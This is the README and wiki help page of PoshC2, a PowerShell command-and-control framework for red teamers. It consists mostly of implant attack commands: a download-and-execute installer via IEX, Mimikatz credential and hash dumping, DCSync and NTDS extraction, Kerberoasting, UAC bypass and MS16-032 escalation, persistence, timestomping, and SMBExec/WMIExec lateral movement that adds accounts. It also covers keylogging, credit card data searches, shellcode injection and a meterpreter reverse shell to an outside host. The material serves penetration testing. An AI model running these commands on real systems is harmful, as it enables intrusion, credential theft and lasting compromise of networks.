# PoshC2
PoshC2 is a proxy aware C2 framework written completely in PowerShell to aid penetration testers with red teaming, post-exploitation and lateral movement. The tools and modules were developed off the back of our successful PowerShell sessions and payload types for the Metasploit Framework. PowerShell was chosen as the base language as it provides all of the functionality and rich features required without needing to introduce multiple languages to the framework.

Find us on #Slack - poshc2.slack.com

Requires only Powershell v2 on both server and client

![alt tag](https://github.com/nettitude/PoshC2/wiki/images/C2-server-1.PNG)

C2 Server

![alt tag](https://github.com/nettitude/PoshC2/wiki/images/main_posh.png)

Implant Handler

![alt tag](https://github.com/nettitude/PoshC2/wiki/images/ImplantHandler.png)

# Quick Install 

powershell -exec bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/nettitude/PoshC2/master/C2-Installer.ps1')"

# Team Server

Create one PoshC2 team server and allow multiple red teamers to connect using the C2 Viewer and Implant Handler

# Wiki

For more info see the GitHub Wiki
# Welcome to the PoshC2 wiki page

# Implant Help:

# Implant Features:

Beacon 60s / Beacon 10m / Beacon 2h

Turtle 60s / Turtle 30m / Turtle 8h

Kill-Implant

Hide-Implant

Unhide-Implant

Invoke-Enum

Get-Proxy

Get-ComputerInfo

Unzip <source file> <destination folder>

Get-System

Get-System-WithProxy

Get-System-WithDaisy

Get-ImplantWorkingDirectory

Get-Pid

Get-Webpage http://intranet

ListModules

ModulesLoaded

LoadModule <modulename>

LoadModule Inveigh.ps1

Invoke-Expression (Get-Webclient).DownloadString("https://module.ps1")

StartAnotherImplant or SAI

Invoke-DaisyChain -name dc1daisy -daisyserver http://192.168.1.1 -port 80 -c2port 80 -c2server http://c2.goog.com -domfront aaa.clou.com -proxyurl http://10.0.0.1:8080 -proxyuser dom\test -proxypassword pass

CreateProxyPayload -user <dom\user> -pass <pass> -proxyurl <http://10.0.0.1:8080>

Get-MSHotfixes

Get-FireWallRulesAll | Out-String -Width 200

EnableRDP

DisableRDP

Netsh.exe advfirewall firewall add rule name="EnableRDP" dir=in action=allow protocol=TCP localport=any enable=yes

Get-WLANPass

Get-WmiObject -Class Win32_Product

Get-CreditCardData -Path 'C:\Backup\'

TimeStomp C:\Windows\System32\Service.exe "01/03/2008 12:12 pm"

iCacls C:\Windows\System32\ResetPassword.exe /grant Administrator:F

# Privilege Escalation:

Invoke-AllChecks

Invoke-UACBypass

Invoke-UACBypassProxy

Get-MSHotFixes | Where-Object {$_.hotfixid -eq "KB2852386"}

Invoke-MS16-032

Invoke-MS16-032-ProxyPayload

Get-GPPPassword

Get-Content 'C:\ProgramData\McAfee\Common Framework\SiteList.xml'

Dir -Recurse | Select-String -pattern 'password='

# File Management:

Download-File -Source 'C:\Temp Dir\Run.exe'

Download-Files -Directory 'C:\Temp Dir\'

Upload-File -Source 'C:\Temp\Run.exe' -Destination 'C:\Temp\Test.exe'

Web-Upload-File -From 'http://www.example.com/App.exe' -To 'C:\Temp\App.exe'

# Persistence:

Install-Persistence 1,2,3

Remove-Persistence 1,2,3

InstallExe-Persistence

RemoveExe-Persistence

Install-ServiceLevel-Persistence | Remove-ServiceLevel-Persistence

Install-ServiceLevel-PersistenceWithProxy | Remove-ServiceLevel-Persistence

# Network Tasks / Lateral Movement:

Get-ExternalIP

Test-ADCredential -Domain test -User ben -Password Password1

Invoke-SMBLogin -Target 192.168.100.20 -Domain TESTDOMAIN -Username TEST -Hash/-Password

Invoke-SMBExec -Target 192.168.100.20 -Domain TESTDOMAIN -Username TEST -Hash/-Pass -Command "net user SMBExec Winter2017 /add"

Invoke-WMIExec -Target 192.168.100.20 -Domain TESTDOMAIN -Username TEST -Hash/-Pass -Command "net user SMBExec Winter2017 /add"

Net View | Net Users | Net localgroup administrators | Net Accounts /dom

Whoami /groups | Whoami /priv

# Active Directory Enumeration:

Invoke-ACLScanner

Get-ObjectACL -ResolveGUIDs -SamAccountName john

Add-ObjectACL -TargetSamAccountName arobbins -PrincipalSamAccountName harmj0y -Rights ResetPassword

Get-Netuser -admincount | select samaccountname

Get-Netgroup -admincount | select samaccountname

Get-NetGroupMember "Domain Admins" -recurse|select membername

Get-NetComputer | Select-String -pattern "Citrix"

Get-NetComputer -filter operatingsystem=*7*|select name

Get-NetComputer -filter operatingsystem=*2008*|select name

Get-DomainComputer -LDAPFilter "(|(operatingsystem=*7*)(operatingsystem=*2008*))" -SPN "wsman*" -Properties dnshostname,serviceprincipalname,operatingsystem,distinguishedname | fl

Get-NetGroup | Select-String -pattern "Internet"

Get-NetUser -Filter | Select-Object samaccountname,userprincipalname

Get-NetUser -Filter samaccountname=test

Get-NetUser -Filter userprinciplename=test@test.com

Get-NetGroup | select samaccountname

Get-NetGroup "*BEN*" | select samaccountname

Get-NetGroupMember "Domain Admins" -recurse|select membername

Get-NetShare Hostname

Invoke-ShareFinder -Verbose -CheckShareAccess

New-PSDrive -Name "P" -PSProvider "FileSystem" -Root "\\bloredc1\netlogon"

# Domain Trusts:

Get-NetDomain | Get-NetDomainController | Get-NetForestDomain

Invoke-MapDomainTrust

Get-NetUser -domain child.parent.com -Filter samaccountname=test

Get-NetGroup -domain child.parent.com | select samaccountname

# Domain / Network Tasks:

Invoke-BloodHound -CollectionMethod 'Stealth' -CSVFolder C:\temp\

Get-NetDomainController | Select name | get-netsession | select *username,*CName

Get-DFSshare | get-netsession | Select *username,*CName

Get-NetFileServer | get-netsession | Select *username,*CName

Invoke-Kerberoast -OutputFormat HashCat|Select-Object -ExpandProperty hash

Write-SCFFile -IPaddress 127.0.0.1 -Location \\localhost\c$\temp\

Write-INIFile -IPaddress 127.0.0.1 -Location \\localhost\c$\temp\

Get-NetGroup | Select-String -pattern "Internet"

Invoke-Hostscan -IPRangeCIDR 172.16.0.0/24 (Provides list of hosts with 445 open)

Get-NetFileServer -Domain testdomain.com

Find-InterestingFile -Path \\SERVER\Share -OfficeDocs -LastAccessTime (Get-Date).AddDays(-7)

Brute-AD

Brute-LocAdmin -Username administrator

Get-PassPol

Get-PassNotExp

Get-LocAdm

Invoke-Pipekat -Target <ip-optional> -Domain <dom> -Username <user> -Password '<pass>' -Hash <hash-optional>

Invoke-Inveigh -HTTP Y -Proxy Y -NBNS Y -Tool 1

Get-Inveigh | Stop-Inveigh (Gets Output from Inveigh Thread)

Invoke-Sniffer -OutputFile C:\Temp\Output.txt -MaxSize 50MB -LocalIP 10.10.10.10

Invoke-SqlQuery -sqlServer 10.0.0.1 -User sa -Pass sa -Query 'SELECT @@VERSION'

Invoke-Runas -User SomeAccount -Password SomePass -Domain SomeDomain -Command C:\Windows\System32\cmd.exe -Args " /c calc.exe"

Invoke-DCOMPayload -Target <ip>

Invoke-DCOMProxyPayload -Target <ip>

Invoke-DCOMDaisyPayload -Target <ip>

Invoke-PsExecPayload -Target <ip> -Domain <dom> -User <user> -pass '<pass>' -Hash <hash-optional>

Invoke-PsExecProxyPayload -Target <ip> -Domain <dom> -User <user> -pass '<pass>' -Hash <hash-optional>

Invoke-PsExecDiasyPayload -Target <ip> -Domain <dom> -User <user> -pass '<pass>' -Hash <hash-optional>

Invoke-WMIPayload -Target <ip> -Domain <dom> -Username <user> -Password '<pass>' -Hash <hash-optional>

Invoke-WMIProxyPayload -Target <ip> -Domain <dom> -User <user> -pass '<pass>' -Hash <hash-optional>

Invoke-WMIDaisyPayload -Target <ip> -Domain <dom> -user <user> -pass '<pass>'

Invoke-WMIExec -Target <ip> -Domain <dom> -Username <user> -Password '<pass>' -Hash <hash-optional> -command <cmd>

Invoke-WinRMSession -IPAddress <ip> -user <dom\user> -pass <pass>

# Credentials / Tokens / Local Hashes (Must be SYSTEM):

Invoke-Mimikatz | Out-String | Parse-Mimikatz

Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'

Invoke-Mimikatz -Command '"lsadump::sam"'

Invoke-Mimikatz -Command '"lsadump::lsa"'

Invoke-Mimikatz -Command '"lsadump::cache"'

Invoke-Mimikatz -Command '"ts::multirdp"'

Invoke-Mimikatz -Command '"privilege::debug"'

Invoke-Mimikatz -Command '"crypto::capi"'

Invoke-Mimikatz -Command '"crypto::certificates /export"'

Invoke-Mimikatz -Command '"sekurlsa::pth /user:<user> /domain:<dom> /ntlm:<HASH> /run:c:\temp\run.bat"'

Invoke-Mimikatz -Computer 10.0.0.1 -Command '"sekurlsa::pth /user:<user> /domain:<dom> /ntlm:<HASH> /run:c:\temp\run.bat"'

Invoke-TokenManipulation | Select-Object Domain, Username, ProcessId, IsElevated, TokenType | ft -autosize | Out-String

Invoke-TokenManipulation -ImpersonateUser -Username "Domain\User"

# Credentials / Domain Controller Hashes:

Invoke-Mimikatz -Command '"lsadump::dcsync /domain:domain.local /user:administrator"'

Invoke-DCSync -PWDumpFormat

Dump-NTDS -EmptyFolder <emptyfolderpath>

# Useful Modules:

Show-ServerInfo

Get-Screenshot

Get-ScreenshotMulti -Timedelay 120 -Quantity 30

Get-RecentFiles

Cred-Popper

Get-Clipboard

Hashdump

Get-Keystrokes -LogPath "$($Env:TEMP)\key.log"

PortScan -IPaddress 10.0.0.1-50 -Ports "1-65535" -maxQueriesPS 10000

Invoke-Portscan -Hosts 192.168.1.1/24,10.10.10.10 -T 4 -Ports "445,3389,22-25" | Select Hostname,OpenPorts

Invoke-UserHunter -StopOnSuccess

Migrate

Migrate -ProcID 444

Migrate -ProcessPath C:\Windows\System32\cmd.exe

Inject-Shellcode -x86 -Shellcode (GC C:\Temp\Shellcode.bin -Encoding byte) -ProcID 5634

Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 172.16.0.100 -Lport 443 -Force

Get-Eventlog -newest 10000 -instanceid 4624 -logname security | select message -ExpandProperty message | select-string -pattern "user1|user2|user3"

Send-MailMessage -to "itdept@test.com" -from "User01 <user01@example.com>" -subject <> -smtpServer <> -Attachment <>

SharpSocks -Uri http://www.c2.com:9090 -Beacon 2000 -Insecure

